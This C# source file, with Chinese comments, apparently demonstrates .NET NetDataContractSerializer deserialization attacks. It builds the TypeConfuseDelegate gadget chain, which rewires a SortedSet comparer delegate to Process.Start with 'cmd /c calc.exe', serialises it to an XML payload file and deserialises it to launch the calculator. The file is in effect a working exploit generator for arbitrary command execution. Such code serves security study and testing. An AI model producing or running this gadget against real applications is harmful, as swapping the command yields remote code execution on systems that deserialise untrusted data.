using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Serialization;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.SqlServer.Server;

namespace NetDataContractSerializer_1
{
    // 测试类
    [DataContract]
    public class TestClass
    {
        private string classname;
        private string name;
        private int age;

        [DataMember]
        public string Classname { get => classname; set => classname = value; }

        [DataMember]
        public string Name { get => name; set => name = value; }
        
        [DataMember]
        public int Age { get => age; set => age = value; }
        public override string ToString()
        {
            return base.ToString();
        }

        public static void ClassMethod(string value)
        {
            Process.Start(value);
        }
    }

    class Program
    {
        // 测试 NetDataContractSerializer 的序列化
        static void NetDataSer()
        {
            TestClass testClass = new TestClass();
            testClass.Age = 18;
            testClass.Name = "god";
            testClass.Classname = "test";
            FileStream stream = new FileStream("./netdataTest.xml", FileMode.Create);
            NetDataContractSerializer netDataser = new NetDataContractSerializer();
            netDataser.Serialize(stream, testClass);
            stream.Close();
        }

        // 测试 NetDataContractSerializer 的反序列化
        static void NetDataDeser()
        {
            FileStream stream = new FileStream("./netdataTest.xml", FileMode.Open);
            NetDataContractSerializer netDataDeser = new NetDataContractSerializer();
            var person = netDataDeser.Deserialize(stream);
            Console.WriteLine(((TestClass)person).Name);
            stream.Close();
        }

        static SortedSet<string> TypeConfuseDelegateGadget()
        {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);

            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + "calc.exe");

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);
            return set;
        }
        // 生成 gadget
        static void SerializerPayload(SortedSet<string> set)
        {
            FileStream stream = new FileStream("./netdata.xml", FileMode.Create);
            NetDataContractSerializer netDataser = new NetDataContractSerializer();
            netDataser.Serialize(stream, set);
            stream.Close();
        }

        // 反序列化payload, 弹出计算器
        static void DeserPayload()
        {
            FileStream stream = new FileStream("./netdata.xml", FileMode.Open);
            NetDataContractSerializer netDataDeser = new NetDataContractSerializer();
            var person = netDataDeser.Deserialize(stream);
            stream.Close();
        }

        static void Main(string[] args)
        {
            //NetDataSer();
            //NetDataDeser();
            SortedSet<string> set = TypeConfuseDelegateGadget();
            SerializerPayload(set);
            DeserPayload();
        }
    }
}
